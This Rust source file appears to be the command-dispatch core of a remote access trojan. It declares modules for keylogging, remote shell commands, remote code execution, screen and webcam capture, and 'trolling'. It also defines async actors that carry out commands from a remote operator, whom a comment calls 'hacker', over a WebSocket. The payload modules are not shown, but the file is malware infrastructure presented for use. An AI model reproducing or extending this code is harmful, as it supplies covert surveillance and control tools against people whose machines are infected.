use async_trait::async_trait;
use tokio::sync::mpsc;

use tokio_tungstenite::tungstenite::Message;

pub mod audio;
pub mod chat;
pub mod file_system;
pub mod keylogger;
pub mod remote_cmd;
pub mod remote_code_execution;
pub mod remote_screen;
pub mod task_manager;
pub mod trolling;
pub mod webcam;

pub type Command = serde_json::Value;
pub type HandlerResult = anyhow::Result<()>;
// pub type _SocketWriter = SplitSink<WebSocketStream<MaybeTlsStream<TcpStream>>, Message>;
pub type WsMessageSender = mpsc::Sender<Message>;
// pub type ArcMutexSocketWriter = Arc<Mutex<SocketWriter>>;

#[async_trait]
pub trait Actor {
    fn new() -> Self
    where
        Self: Sized;
    async fn handler(&mut self, command: Command, writer: WsMessageSender) -> HandlerResult;
}

pub fn run_actor<ActorGenerique: Actor + Send + 'static>(
    mut receiver: mpsc::Receiver<Command>,
    writer: WsMessageSender,
) {
    let mut actor_state = ActorGenerique::new();

    tokio::spawn(async move {
        while let Some(command) = receiver.recv().await {
            if let Err(e) = actor_state.handler(command, writer.clone()).await {
                eprintln!("Actor handler error: {:?}", e);
            }
        }
    });
}

use crate::actors::chat::Chat;
use tokio::time::{self, Duration};

// special func for chat actor
pub fn run_chat_actor(mut command_receiver: mpsc::Receiver<Command>, writer: WsMessageSender) {
    tokio::spawn(async move {
        let mut actor = Chat::new();
        let mut gui_receiver: Option<std::sync::mpsc::Receiver<String>> = None;

        loop {
            // check messages from gui without blocking
            if let Some(rx) = gui_receiver.as_mut() {
                if let Ok(gui_msg) = rx.try_recv() {
                    if let Err(e) = actor.process_gui_message(gui_msg, &writer).await {
                        crate::dev_eprint!("Error processing GUI message: {}", e);
                    }
                }
            }

            // check messages from hacker with timeout
            match time::timeout(Duration::from_millis(100), command_receiver.recv()).await {
                Ok(Some(command)) => {
                    let action = command.get("action").and_then(|v| v.as_str());

                    match action {
                        Some("start") => match actor.start().await {
                            Ok(rx) => gui_receiver = Some(rx),
                            Err(e) => crate::dev_eprint!("Failed to start chat: {}", e),
                        },
                        Some("stop") => {
                            if let Err(e) = actor.stop().await {
                                crate::dev_eprint!("Failed to stop chat: {}", e);
                            }
                            gui_receiver = None;
                        }
                        _ => {
                            if let Err(e) = actor.handler(command, writer.clone()).await {
                                crate::dev_eprint!("Chat actor handler error: {}", e);
                            }
                        }
                    }
                }
                Ok(None) => break,
                Err(_) => {}
            }
        }
        crate::dev_print!("Chat actor loop finished.");
    });
}
